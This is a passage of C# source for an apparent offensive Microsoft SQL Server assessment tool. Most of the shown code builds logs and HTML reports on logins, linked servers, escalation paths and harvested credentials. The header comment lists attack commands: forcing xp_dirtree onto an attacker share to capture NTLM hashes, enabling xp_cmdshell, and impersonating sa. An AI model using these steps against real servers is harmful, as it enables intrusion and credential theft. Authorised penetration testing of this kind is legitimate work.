using System;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using System.Net;
using System.Text.RegularExpressions;

namespace MSSQL
{
	/*
	 *  Comprehensive Microsoft-SQL attack and enumeration tool
	 *  Build:
	 *      ./build.sh             (Linux – requires msbuild / mono-msbuild)
	 *  Examples:
	 *      # Quick enumeration with logging
	 *      MSSQL.exe --server dc01.corp1.com --action enum --log
	 *
	 *      # Run arbitrary query
	 *      MSSQL.exe --server dc01.corp1.com --action query --sql "SELECT SYSTEM_USER;"
	 *
	 *      # Trigger xp_dirtree on share to capture NTLM
	 *      MSSQL.exe --server dc01.corp1.com --action dirtree --share "\\\\192.168.49.67\\share"
	 *
	 *      # Enable & execute xp_cmdshell
	 *      MSSQL.exe --server dc01.corp1.com --action xp_cmd --cmd "whoami"
	 *
	 *      # Impersonate sa
	 *      MSSQL.exe --server dc01.corp1.com --action impersonate_login --target sa
	 */

	// Session logging and reporting class
	public class SessionLogger
	{
		private string sessionId;
		private string logFile;
		private string outputDir;
		private List<LogEntry> entries;
		private DateTime sessionStart;
		private string targetServer;
		private StreamWriter logWriter;

		public class LogEntry
		{
			public DateTime Timestamp { get; set; }
			public string Action { get; set; }
			public string Command { get; set; }
			public string Output { get; set; }
			public string Status { get; set; }
			public string Context { get; set; }
		}

		public SessionLogger(string server, bool enableLogging = true)
		{
			if (!enableLogging) return;

			sessionStart = DateTime.Now;
			sessionId = sessionStart.ToString("yyyyMMdd_HHmmss");
			targetServer = server;
			outputDir = Path.Combine(Directory.GetCurrentDirectory(), $"MSSQL_Session_{sessionId}");
			Directory.CreateDirectory(outputDir);
			
			logFile = Path.Combine(outputDir, "session.log");
			entries = new List<LogEntry>();
			
			logWriter = new StreamWriter(logFile, true);
			LogAction("SESSION_START", $"Target: {server}", $"Session started by {Environment.UserName}");
			
			Console.WriteLine($"[+] Logging enabled - Output directory: {outputDir}");
		}

		public void LogAction(string action, string command, string output, string status = "SUCCESS", string context = null)
		{
			if (logWriter == null) return;

			var entry = new LogEntry
			{
				Timestamp = DateTime.Now,
				Action = action,
				Command = TruncateText(command ?? "", 200),
				Output = TruncateText(output ?? "", 2000),
				Status = status,
				Context = context
			};
			
			entries.Add(entry);
			
			// Write to log file
			logWriter.WriteLine($"[{entry.Timestamp:yyyy-MM-dd HH:mm:ss}] {action} | {status} | {entry.Command}");
			if (!string.IsNullOrEmpty(entry.Output))
				logWriter.WriteLine($"    OUTPUT: {entry.Output.Replace("\n", "\n    ")}");
			if (!string.IsNullOrEmpty(context))
				logWriter.WriteLine($"    CONTEXT: {context}");
			logWriter.WriteLine();
			logWriter.Flush();
		}

		private string TruncateText(string text, int maxLength)
		{
			if (string.IsNullOrEmpty(text) || text.Length <= maxLength)
				return text;
			
			return text.Substring(0, maxLength - 3) + "...";
		}

		public void ExportTableData(string tableName, string csvData, string jsonData = null)
		{
			if (logWriter == null) return;

			try
			{
				// Export as CSV
				string csvFile = Path.Combine(outputDir, $"{SanitizeFileName(tableName)}.csv");
				File.WriteAllText(csvFile, csvData);
				LogAction("TABLE_EXPORT", $"Export table: {tableName}", $"Exported to: {csvFile}");

				// Export as JSON if provided
				if (!string.IsNullOrEmpty(jsonData))
				{
					string jsonFile = Path.Combine(outputDir, $"{SanitizeFileName(tableName)}.json");
					File.WriteAllText(jsonFile, jsonData);
					LogAction("TABLE_EXPORT", $"Export table: {tableName}", $"JSON exported to: {jsonFile}");
				}
			}
			catch (Exception ex)
			{
				LogAction("TABLE_EXPORT", $"Export table: {tableName}", ex.Message, "ERROR");
			}
		}

		public void ExportCredentials(List<string> credentials)
		{
			if (logWriter == null || credentials.Count == 0) return;

			try
			{
				string credFile = Path.Combine(outputDir, "credentials.txt");
				File.WriteAllLines(credFile, credentials);
				LogAction("CREDENTIAL_EXPORT", "Extract credentials", $"Found {credentials.Count} credentials in: {credFile}");
			}
			catch (Exception ex)
			{
				LogAction("CREDENTIAL_EXPORT", "Extract credentials", ex.Message, "ERROR");
			}
		}

		public void ExportStructuredData(string fileName, object data, string description)
		{
			if (logWriter == null) return;

			try
			{
				string jsonData = JsonSerializer.Serialize(data, new JsonSerializerOptions { WriteIndented = true });
				string filePath = Path.Combine(outputDir, fileName);
				File.WriteAllText(filePath, jsonData);
				LogAction("STRUCTURED_EXPORT", description, $"Data exported to: {filePath}");
			}
			catch (Exception ex)
			{
				LogAction("STRUCTURED_EXPORT", description, ex.Message, "ERROR");
			}
		}

		public void GenerateReport()
		{
			if (logWriter == null) return;

			try
			{
				// Generate chronological session report
				string sessionReport = GenerateSessionReport();
				string sessionFile = Path.Combine(outputDir, "session_report.html");
				File.WriteAllText(sessionFile, sessionReport);

				// Generate structured data report
				string dataReport = GenerateStructuredDataReport();
				string dataFile = Path.Combine(outputDir, "data_report.html");
				File.WriteAllText(dataFile, dataReport);

				// Generate JSON report
				string jsonReport = JsonSerializer.Serialize(new
				{
					SessionId = sessionId,
					Target = targetServer,
					StartTime = sessionStart,
					EndTime = DateTime.Now,
					Duration = DateTime.Now - sessionStart,
					Entries = entries
				}, new JsonSerializerOptions { WriteIndented = true });
				
				string jsonFile = Path.Combine(outputDir, "report.json");
				File.WriteAllText(jsonFile, jsonReport);

				LogAction("REPORT_GENERATION", "Generate session report", $"Session: {sessionFile}, Data: {dataFile}, JSON: {jsonFile}");
				Console.WriteLine($"[+] Session reports generated:");
				Console.WriteLine($"    Session Timeline: {sessionFile}");
				Console.WriteLine($"    Structured Data: {dataFile}");
				Console.WriteLine($"    JSON Data: {jsonFile}");
			}
			catch (Exception ex)
			{
				LogAction("REPORT_GENERATION", "Generate session report", ex.Message, "ERROR");
			}
		}

		private string GenerateStructuredDataReport()
		{
			var sb = new StringBuilder();
			sb.AppendLine("<!DOCTYPE html>");
			sb.AppendLine("<html><head>");
			sb.AppendLine("<title>MSSQL Assessment - Structured Data Report</title>");
			sb.AppendLine("<style>");
			sb.AppendLine("body { font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #f8f9fa; }");
			sb.AppendLine(".container { max-width: 1400px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }");
			sb.AppendLine("h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-bottom: 30px; }");
			sb.AppendLine("h2 { color: #34495e; margin-top: 40px; margin-bottom: 20px; padding: 10px; background: #ecf0f1; border-left: 4px solid #3498db; }");
			sb.AppendLine("h3 { color: #2c3e50; margin-top: 25px; }");
			sb.AppendLine("table { width: 100%; border-collapse: collapse; margin: 20px 0; background: white; }");
			sb.AppendLine("th { background: #34495e; color: white; padding: 12px; text-align: left; font-weight: bold; }");
			sb.AppendLine("td { border: 1px solid #bdc3c7; padding: 10px; }");
			sb.AppendLine("tr:nth-child(even) { background: #f8f9fa; }");
			sb.AppendLine("tr:hover { background: #e8f4f8; }");
			sb.AppendLine(".critical { background: #e74c3c; color: white; font-weight: bold; text-align: center; }");
			sb.AppendLine(".high { background: #f39c12; color: white; font-weight: bold; text-align: center; }");
			sb.AppendLine(".medium { background: #f1c40f; color: #2c3e50; font-weight: bold; text-align: center; }");
			sb.AppendLine(".low { background: #95a5a6; color: white; text-align: center; }");
			sb.AppendLine(".success { background: #27ae60; color: white; text-align: center; }");
			sb.AppendLine(".info-box { background: #d5dbdb; padding: 15px; margin: 20px 0; border-left: 4px solid #3498db; }");
			sb.AppendLine(".summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }");
			sb.AppendLine(".summary-card { background: #3498db; color: white; padding: 20px; border-radius: 8px; text-align: center; }");
			sb.AppendLine(".summary-number { font-size: 2.5em; font-weight: bold; margin-bottom: 5px; }");
			sb.AppendLine(".code { background: #2c3e50; color: #ecf0f1; padding: 8px 12px; border-radius: 4px; font-family: 'Courier New', monospace; }");
			sb.AppendLine("</style>");
			sb.AppendLine("</head><body>");
			sb.AppendLine("<div class='container'>");
			
			sb.AppendLine("<h1>MSSQL Security Assessment - Structured Data Report</h1>");
			sb.AppendLine($"<div class='info-box'>");
			sb.AppendLine($"<strong>Target Server:</strong> {targetServer}<br>");
			sb.AppendLine($"<strong>Assessment Date:</strong> {DateTime.Now:yyyy-MM-dd HH:mm:ss}<br>");
			sb.AppendLine($"<strong>Session Duration:</strong> {DateTime.Now - sessionStart:hh\\:mm\\:ss}");
			sb.AppendLine("</div>");

			// Load and parse the enumeration summary
			try
			{
				string summaryFile = Path.Combine(outputDir, "enumeration_summary.json");
				if (File.Exists(summaryFile))
				{
					string summaryJson = File.ReadAllText(summaryFile);
					var summary = JsonSerializer.Deserialize<JsonElement>(summaryJson);
					
					// Executive Summary
					sb.AppendLine("<h2>Executive Summary</h2>");
					sb.AppendLine("<div class='summary-grid'>");
					
					if (summary.TryGetProperty("Summary", out var summaryData))
					{
						if (summaryData.TryGetProperty("TotalLinkedServers", out var totalLinked))
							sb.AppendLine($"<div class='summary-card'><div class='summary-number'>{totalLinked.GetInt32()}</div><div>Linked Servers</div></div>");
						if (summaryData.TryGetProperty("ExecutableLinkedServers", out var execLinked))
							sb.AppendLine($"<div class='summary-card'><div class='summary-number'>{execLinked.GetInt32()}</div><div>Executable Links</div></div>");
						if (summaryData.TryGetProperty("ImpersonatableLoginsCount", out var impersonatable))
							sb.AppendLine($"<div class='summary-card'><div class='summary-number'>{impersonatable.GetInt32()}</div><div>Impersonatable Logins</div></div>");
						if (summaryData.TryGetProperty("EscalationPathsFound", out var escalation))
							sb.AppendLine($"<div class='summary-card'><div class='summary-number'>{escalation.GetInt32()}</div><div>Escalation Paths</div></div>");
					}
					sb.AppendLine("</div>");

					// Server Information
					if (summary.TryGetProperty("ServerInfo", out var serverInfo))
					{
						sb.AppendLine("<h2>Server Information</h2>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Property</th><th>Value</th></tr>");
						
						if (serverInfo.TryGetProperty("SystemUser", out var systemUser))
							sb.AppendLine($"<tr><td>System User</td><td>{WebUtility.HtmlEncode(systemUser.GetString())}</td></tr>");
						if (serverInfo.TryGetProperty("UserName", out var userName))
							sb.AppendLine($"<tr><td>Database User</td><td>{WebUtility.HtmlEncode(userName.GetString())}</td></tr>");
						if (serverInfo.TryGetProperty("ServerName", out var serverName))
							sb.AppendLine($"<tr><td>Server Name</td><td>{WebUtility.HtmlEncode(serverName.GetString())}</td></tr>");
						if (serverInfo.TryGetProperty("Version", out var version))
							sb.AppendLine($"<tr><td>SQL Server Version</td><td>{WebUtility.HtmlEncode(version.GetString())}</td></tr>");
						
						sb.AppendLine("</table>");
					}

					// Privilege Analysis
					sb.AppendLine("<h2>Privilege Analysis</h2>");
					
					// Server Roles
					if (summary.TryGetProperty("ServerRoles", out var serverRoles))
					{
						sb.AppendLine("<h3>Active Server Roles</h3>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Role</th><th>Status</th><th>Description</th></tr>");
						
						foreach (var role in serverRoles.EnumerateArray())
						{
							string roleName = role.GetString();
							string description = GetRoleDescription(roleName);
							string severity = GetRoleSeverity(roleName);
							sb.AppendLine($"<tr><td>{roleName}</td><td class='{severity}'>ACTIVE</td><td>{description}</td></tr>");
						}
						sb.AppendLine("</table>");
					}

					// Impersonatable Logins
					if (summary.TryGetProperty("ImpersonatableLogins", out var logins))
					{
						sb.AppendLine("<h3>Impersonatable Login Accounts</h3>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Login Name</th><th>Roles</th><th>Risk Level</th><th>Key Permissions</th></tr>");
						
						foreach (var login in logins.EnumerateArray())
						{
							if (login.TryGetProperty("LoginName", out var loginName) &&
								login.TryGetProperty("Roles", out var roles) &&
								login.TryGetProperty("IsSysAdmin", out var isSysAdmin))
							{
								string riskLevel = isSysAdmin.GetBoolean() ? "critical" : "high";
								string riskText = isSysAdmin.GetBoolean() ? "CRITICAL" : "HIGH";
								
								sb.AppendLine($"<tr>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(loginName.GetString())}</span></td>");
								
								// Roles
								sb.AppendLine("<td>");
								foreach (var role in roles.EnumerateArray())
									sb.AppendLine($"{role.GetString()}<br>");
								sb.AppendLine("</td>");
								
								sb.AppendLine($"<td class='{riskLevel}'>{riskText}</td>");
								
								// Clean permissions (remove unicode)
								sb.AppendLine("<td>");
								if (login.TryGetProperty("Permissions", out var permissions))
								{
									foreach (var perm in permissions.EnumerateArray())
									{
										string cleanPerm = CleanPermissionText(perm.GetString());
										sb.AppendLine($"• {cleanPerm}<br>");
									}
								}
								sb.AppendLine("</td>");
								sb.AppendLine("</tr>");
							}
						}
						sb.AppendLine("</table>");
					}

					// Network Topology
					if (summary.TryGetProperty("NetworkTopology", out var topology))
					{
						sb.AppendLine("<h2>Network Topology & Linked Servers</h2>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Server Name</th><th>Access Level</th><th>Remote Context</th><th>Command Execution</th></tr>");
						
						foreach (var server in topology.EnumerateArray())
						{
							if (server.TryGetProperty("ServerName", out var srvName) &&
								server.TryGetProperty("AccessLevel", out var accessLevel) &&
								server.TryGetProperty("RemoteContext", out var remoteContext) &&
								server.TryGetProperty("CanExecuteCommands", out var canExec))
							{
								string accessClass = accessLevel.GetString().Contains("Full") ? "critical" : 
									accessLevel.GetString().Contains("Limited") ? "medium" : "low";
								string execClass = canExec.GetBoolean() ? "critical" : "low";
								string execText = canExec.GetBoolean() ? "YES" : "NO";
								
								sb.AppendLine("<tr>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(srvName.GetString())}</span></td>");
								sb.AppendLine($"<td class='{accessClass}'>{WebUtility.HtmlEncode(accessLevel.GetString())}</td>");
								sb.AppendLine($"<td>{WebUtility.HtmlEncode(remoteContext.GetString())}</td>");
								sb.AppendLine($"<td class='{execClass}'>{execText}</td>");
								sb.AppendLine("</tr>");
							}
						}
						sb.AppendLine("</table>");
					}

					// Escalation Paths
					if (summary.TryGetProperty("EscalationPaths", out var escalationPaths))
					{
						sb.AppendLine("<h2>Attack Escalation Paths</h2>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Attack Vector</th><th>Severity</th><th>Target</th><th>Command</th></tr>");
						
						foreach (var path in escalationPaths.EnumerateArray())
						{
							if (path.TryGetProperty("Type", out var type) &&
								path.TryGetProperty("Severity", out var severity))
							{
								string severityClass = severity.GetString().ToLower();
								
								sb.AppendLine("<tr>");
								sb.AppendLine($"<td>{type.GetString().Replace("_", " ")}</td>");
								sb.AppendLine($"<td class='{severityClass}'>{severity.GetString()}</td>");
								
								if (path.TryGetProperty("Target", out var target))
									sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(target.GetString())}</span></td>");
								else if (path.TryGetProperty("Targets", out var targets))
								{
									sb.AppendLine("<td>");
									foreach (var t in targets.EnumerateArray())
										sb.AppendLine($"<span class='code'>{WebUtility.HtmlEncode(t.GetString())}</span><br>");
									sb.AppendLine("</td>");
								}
								else
									sb.AppendLine("<td>-</td>");
								
								if (path.TryGetProperty("Command", out var command))
									sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(command.GetString())}</span></td>");
								else
									sb.AppendLine("<td>-</td>");
								
								sb.AppendLine("</tr>");
							}
						}
						sb.AppendLine("</table>");
					}
					
					// Add Database Structure Analysis
					AddDatabaseStructureSection(sb, outputDir);
					
					// Add User and Permission Analysis
					AddUserPermissionSection(sb, outputDir);
				}
			}
			catch (Exception ex)
			{
				sb.AppendLine($"<div class='info-box'><strong>Note:</strong> Could not load structured data: {ex.Message}</div>");
			}

			sb.AppendLine("<hr>");
			sb.AppendLine($"<p><em>Report generated by MSSQL Security Assessment Tool on {DateTime.Now:yyyy-MM-dd HH:mm:ss}</em></p>");
			sb.AppendLine("</div></body></html>");

			return sb.ToString();
		}

		private string CleanPermissionText(string permission)
		{
			// Remove unicode characters and clean up permission text
			return permission
				.Replace("\uD83C\uDFAF", "[CRITICAL]")
				.Replace("\uD83D\uDD10", "[SECURITY]")
				.Replace("\u2699\uFE0F", "[SERVER]")
				.Replace("\uD83D\uDDC4\uFE0F", "[DATABASE]")
				.Replace("\uD83D\uDEA8", "[CONTROL]")
				.Replace("\uD83D\uDC64", "[USER]")
				.Replace("\uD83C\uDFAD", "[IMPERSONATE]")
				.Replace("\uD83D\uDCBB", "[CMDSHELL]")
				.Replace("\u26A1", "[ENABLE]")
				.Trim();
		}

		private string GetRoleDescription(string role)
		{
			return role.ToLower() switch
			{
				"sysadmin" => "Full administrative control over SQL Server instance",
				"securityadmin" => "Manage logins and their properties, grant/revoke permissions",
				"serveradmin" => "Change server-wide configuration options and shut down server",
				"setupadmin" => "Add and remove linked servers, execute system stored procedures",
				"processadmin" => "End processes running in SQL Server instance",
				"diskadmin" => "Manage disk files and backup devices",
				"dbcreator" => "Create, alter, drop, and restore any database",
				"bulkadmin" => "Execute BULK INSERT statements",
				"public" => "Default role for all SQL Server users",
				_ => "Standard server role"
			};
		}

		private string GetRoleSeverity(string role)
		{
			return role.ToLower() switch
			{
				"sysadmin" => "critical",
				"securityadmin" => "high",
				"serveradmin" => "high",
				"setupadmin" => "medium",
				"processadmin" => "medium",
				"diskadmin" => "medium",
				"dbcreator" => "medium",
				"bulkadmin" => "low",
				_ => "low"
			};
		}

		private string GenerateSessionReport()
		{
			var html = new StringBuilder();
			html.AppendLine("<!DOCTYPE html>");
			html.AppendLine("<html><head><title>MSSQL Assessment - Session Timeline</title>");
			html.AppendLine("<style>");
			html.AppendLine("body { font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #f8f9fa; }");
			html.AppendLine(".container { max-width: 1400px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }");
			html.AppendLine("h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-bottom: 30px; }");
			html.AppendLine("h2 { color: #34495e; margin-top: 30px; }");
			html.AppendLine("table { width: 100%; border-collapse: collapse; margin: 20px 0; }");
			html.AppendLine("th { background: #34495e; color: white; padding: 12px; text-align: left; font-weight: bold; }");
			html.AppendLine("td { border: 1px solid #bdc3c7; padding: 10px; vertical-align: top; }");
			html.AppendLine("tr:nth-child(even) { background: #f8f9fa; }");
			html.AppendLine("tr:hover { background: #e8f4f8; }");
			html.AppendLine(".success { background: #27ae60; color: white; text-align: center; font-weight: bold; }");
			html.AppendLine(".error { background: #e74c3c; color: white; text-align: center; font-weight: bold; }");
			html.AppendLine(".action-connection { background: #3498db; color: white; }");
			html.AppendLine(".action-enum { background: #9b59b6; color: white; }");
			html.AppendLine(".action-command { background: #e67e22; color: white; }");
			html.AppendLine(".action-export { background: #1abc9c; color: white; }");
			html.AppendLine(".output { font-family: 'Courier New', monospace; background: #2c3e50; color: #ecf0f1; padding: 8px; border-radius: 4px; max-height: 200px; overflow-y: auto; }");
			html.AppendLine(".info-box { background: #d5dbdb; padding: 15px; margin: 20px 0; border-left: 4px solid #3498db; }");
			html.AppendLine(".summary-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }");
			html.AppendLine(".stat-card { background: #34495e; color: white; padding: 15px; border-radius: 6px; text-align: center; }");
			html.AppendLine(".stat-number { font-size: 2em; font-weight: bold; margin-bottom: 5px; }");
			html.AppendLine("</style></head><body>");
			html.AppendLine("<div class='container'>");
			
			html.AppendLine("<h1>MSSQL Security Assessment - Session Timeline</h1>");
			html.AppendLine("<div class='info-box'>");
			html.AppendLine($"<strong>Target Server:</strong> {targetServer}<br>");
			html.AppendLine($"<strong>Session ID:</strong> {sessionId}<br>");
			html.AppendLine($"<strong>Start Time:</strong> {sessionStart:yyyy-MM-dd HH:mm:ss}<br>");
			html.AppendLine($"<strong>End Time:</strong> {DateTime.Now:yyyy-MM-dd HH:mm:ss}<br>");
			html.AppendLine($"<strong>Duration:</strong> {DateTime.Now - sessionStart:hh\\:mm\\:ss}");
			html.AppendLine("</div>");
			
			// Session Statistics
			var successCount = entries.Count(e => e.Status == "SUCCESS");
			var errorCount = entries.Count(e => e.Status == "ERROR");
			var connectionCount = entries.Count(e => e.Action.Contains("CONNECTION"));
			var commandCount = entries.Count(e => e.Action.Contains("COMMAND") || e.Action.Contains("EXECUTION"));
			var enumCount = entries.Count(e => e.Action.Contains("ENUM") || e.Action.Contains("SERVER_INFO") || e.Action.Contains("ROLES"));
			
			html.AppendLine("<h2>Session Statistics</h2>");
			html.AppendLine("<div class='summary-stats'>");
			html.AppendLine($"<div class='stat-card'><div class='stat-number'>{entries.Count}</div><div>Total Actions</div></div>");
			html.AppendLine($"<div class='stat-card'><div class='stat-number'>{successCount}</div><div>Successful</div></div>");
			html.AppendLine($"<div class='stat-card'><div class='stat-number'>{errorCount}</div><div>Errors</div></div>");
			html.AppendLine($"<div class='stat-card'><div class='stat-number'>{enumCount}</div><div>Enumerations</div></div>");
			html.AppendLine($"<div class='stat-card'><div class='stat-number'>{commandCount}</div><div>Commands</div></div>");
			html.AppendLine("</div>");
			
			html.AppendLine("<h2>Chronological Action Log</h2>");
			html.AppendLine("<table>");
			html.AppendLine("<tr><th>Time</th><th>Action Type</th><th>Command/Description</th><th>Status</th><th>Output/Result</th></tr>");
			
			foreach (var entry in entries)
			{
				string statusClass = entry.Status == "SUCCESS" ? "success" : "error";
				string actionClass = GetActionClass(entry.Action);
				string actionDisplay = FormatActionName(entry.Action);
				
				html.AppendLine("<tr>");
				html.AppendLine($"<td>{entry.Timestamp:HH:mm:ss}</td>");
				html.AppendLine($"<td class='{actionClass}'>{actionDisplay}</td>");
				html.AppendLine($"<td>{WebUtility.HtmlEncode(entry.Command ?? "")}</td>");
				html.AppendLine($"<td class='{statusClass}'>{entry.Status}</td>");
				
				// Format output nicely
				string output = entry.Output ?? "";
				if (output.Length > 500)
					output = output.Substring(0, 500) + "... (truncated)";
				
				if (!string.IsNullOrEmpty(output))
					html.AppendLine($"<td><div class='output'>{WebUtility.HtmlEncode(output)}</div></td>");
				else
					html.AppendLine("<td>-</td>");
				
				html.AppendLine("</tr>");
			}
			
			html.AppendLine("</table>");
			html.AppendLine("<hr>");
			html.AppendLine($"<p><em>Report generated by MSSQL Security Assessment Tool on {DateTime.Now:yyyy-MM-dd HH:mm:ss}</em></p>");
			html.AppendLine("</div></body></html>");
			
			return html.ToString();
		}

		private string GetActionClass(string action)
		{
			if (action.Contains("CONNECTION") || action.Contains("SESSION"))
				return "action-connection";
			if (action.Contains("ENUM") || action.Contains("SERVER_INFO") || action.Contains("ROLES") || action.Contains("TOPOLOGY"))
				return "action-enum";
			if (action.Contains("COMMAND") || action.Contains("EXECUTION") || action.Contains("IMPERSONATE"))
				return "action-command";
			if (action.Contains("EXPORT") || action.Contains("STRUCTURED"))
				return "action-export";
			return "";
		}

		private string FormatActionName(string action)
		{
			return action.Replace("_", " ").ToLowerInvariant()
				.Split(' ')
				.Select(word => char.ToUpperInvariant(word[0]) + word.Substring(1))
				.Aggregate((a, b) => a + " " + b);
		}

		private string SanitizeFileName(string fileName)
		{
			foreach (char c in Path.GetInvalidFileNameChars())
				fileName = fileName.Replace(c, '_');
			return fileName;
		}

		private void AddDatabaseStructureSection(StringBuilder sb, string outputDir)
		{
			string dbStructureFile = Path.Combine(outputDir, "database_structure.json");
			if (File.Exists(dbStructureFile))
			{
				try
				{
					string jsonContent = File.ReadAllText(dbStructureFile);
					var dbStructure = JsonDocument.Parse(jsonContent);
					var root = dbStructure.RootElement;
					
					sb.AppendLine("<h2>Database Structure Analysis</h2>");
					
					// Summary
					sb.AppendLine("<div class='summary-grid'>");
					sb.AppendLine($"<div class='metric'><span class='metric-value'>{root.GetProperty("TotalDatabases").GetInt32()}</span><span class='metric-label'>Databases</span></div>");
					sb.AppendLine($"<div class='metric'><span class='metric-value'>{root.GetProperty("TotalTables").GetInt32()}</span><span class='metric-label'>Tables</span></div>");
					sb.AppendLine($"<div class='metric'><span class='metric-value'>{root.GetProperty("TotalColumns").GetInt32()}</span><span class='metric-label'>Columns</span></div>");
					sb.AppendLine("</div>");
					
					// Database Details
					if (root.TryGetProperty("DatabaseDetails", out var dbDetails))
					{
						sb.AppendLine("<h3>Database Details</h3>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Database</th><th>Tables</th><th>Columns</th><th>Interesting Tables</th><th>Credential Columns</th><th>Sensitive Columns</th></tr>");
						
						foreach (var db in dbDetails.EnumerateArray())
						{
							sb.AppendLine("<tr>");
							sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(db.GetProperty("DatabaseName").GetString())}</span></td>");
							sb.AppendLine($"<td>{db.GetProperty("TableCount").GetInt32()}</td>");
							sb.AppendLine($"<td>{db.GetProperty("ColumnCount").GetInt32()}</td>");
							
							int interestingCount = db.GetProperty("InterestingTables").GetArrayLength();
							int credentialCount = db.GetProperty("CredentialColumns").GetArrayLength();
							int sensitiveCount = db.GetProperty("SensitiveColumns").GetArrayLength();
							
							sb.AppendLine($"<td class='{(interestingCount > 0 ? "high" : "")}'>{interestingCount}</td>");
							sb.AppendLine($"<td class='{(credentialCount > 0 ? "critical" : "")}'>{credentialCount}</td>");
							sb.AppendLine($"<td class='{(sensitiveCount > 0 ? "high" : "")}'>{sensitiveCount}</td>");
							sb.AppendLine("</tr>");
						}
						sb.AppendLine("</table>");
					}
					
					// Interesting Findings
					if (root.TryGetProperty("DatabaseDetails", out var details))
					{
						var allCredentials = new List<object>();
						var allSensitive = new List<object>();
						
						foreach (var db in details.EnumerateArray())
						{
							string dbName = db.GetProperty("DatabaseName").GetString();
							
							foreach (var col in db.GetProperty("CredentialColumns").EnumerateArray())
							{
								allCredentials.Add(new { Database = dbName, Column = col });
							}
							
							foreach (var col in db.GetProperty("SensitiveColumns").EnumerateArray())
							{
								allSensitive.Add(new { Database = dbName, Column = col });
							}
						}
						
						if (allCredentials.Any())
						{
							sb.AppendLine("<h3>Credential-Related Columns</h3>");
							sb.AppendLine("<table>");
							sb.AppendLine("<tr><th>Database</th><th>Table</th><th>Column</th><th>Data Type</th><th>Keywords</th></tr>");
							
							foreach (var item in allCredentials.Take(20)) // Limit to prevent huge tables
							{
								var col = ((dynamic)item).Column;
								sb.AppendLine("<tr>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(((dynamic)item).Database)}</span></td>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(col.GetProperty("TableName").GetString())}</span></td>");
								sb.AppendLine($"<td class='critical'><span class='code'>{WebUtility.HtmlEncode(col.GetProperty("ColumnName").GetString())}</span></td>");
								sb.AppendLine($"<td>{WebUtility.HtmlEncode(col.GetProperty("DataType").GetString())}</td>");
								
								var keywordList = new List<string>();
								foreach (var k in col.GetProperty("MatchedKeywords").EnumerateArray())
								{
									keywordList.Add(k.GetString());
								}
								sb.AppendLine($"<td>{string.Join(", ", keywordList)}</td>");
								sb.AppendLine("</tr>");
							}
							sb.AppendLine("</table>");
							
							if (allCredentials.Count > 20)
								sb.AppendLine($"<p><em>... and {allCredentials.Count - 20} more credential columns</em></p>");
						}
						
						if (allSensitive.Any())
						{
							sb.AppendLine("<h3>Sensitive Data Columns</h3>");
							sb.AppendLine("<table>");
							sb.AppendLine("<tr><th>Database</th><th>Table</th><th>Column</th><th>Data Type</th><th>Keywords</th></tr>");
							
							foreach (var item in allSensitive.Take(15)) // Limit to prevent huge tables
							{
								var col = ((dynamic)item).Column;
								sb.AppendLine("<tr>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(((dynamic)item).Database)}</span></td>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(col.GetProperty("TableName").GetString())}</span></td>");
								sb.AppendLine($"<td class='high'><span class='code'>{WebUtility.HtmlEncode(col.GetProperty("ColumnName").GetString())}</span></td>");
								sb.AppendLine($"<td>{WebUtility.HtmlEncode(col.GetProperty("DataType").GetString())}</td>");
								
								var keywordList2 = new List<string>();
								foreach (var k in col.GetProperty("MatchedKeywords").EnumerateArray())
								{
									keywordList2.Add(k.GetString());
								}
								sb.AppendLine($"<td>{string.Join(", ", keywordList2)}</td>");
								sb.AppendLine("</tr>");
							}
							sb.AppendLine("</table>");
							
							if (allSensitive.Count > 15)
								sb.AppendLine($"<p><em>... and {allSensitive.Count - 15} more sensitive columns</em></p>");
						}
					}
				}
				catch (Exception ex)
				{
					sb.AppendLine("<h2>Database Structure Analysis</h2>");
					sb.AppendLine($"<p class='error'>Error loading database structure data: {WebUtility.HtmlEncode(ex.Message)}</p>");
				}
			}
		}

		private void AddUserPermissionSection(StringBuilder sb, string outputDir)
		{
			string userPermFile = Path.Combine(outputDir, "users_and_permissions.json");
			if (File.Exists(userPermFile))
			{
				try
				{
					string jsonContent = File.ReadAllText(userPermFile);
					var userPerm = JsonDocument.Parse(jsonContent);
					var root = userPerm.RootElement;
					
					sb.AppendLine("<h2>User and Permission Analysis</h2>");
					
					// Summary
					if (root.TryGetProperty("Summary", out var summary))
					{
						sb.AppendLine("<div class='summary-grid'>");
						sb.AppendLine($"<div class='metric'><span class='metric-value'>{summary.GetProperty("TotalServerLogins").GetInt32()}</span><span class='metric-label'>Server Logins</span></div>");
						sb.AppendLine($"<div class='metric'><span class='metric-value'>{summary.GetProperty("TotalDatabaseUsers").GetInt32()}</span><span class='metric-label'>Database Users</span></div>");
						sb.AppendLine($"<div class='metric'><span class='metric-value'>{summary.GetProperty("DatabasesAnalyzed").GetInt32()}</span><span class='metric-label'>Databases</span></div>");
						sb.AppendLine("</div>");
					}
					
					// Server Logins
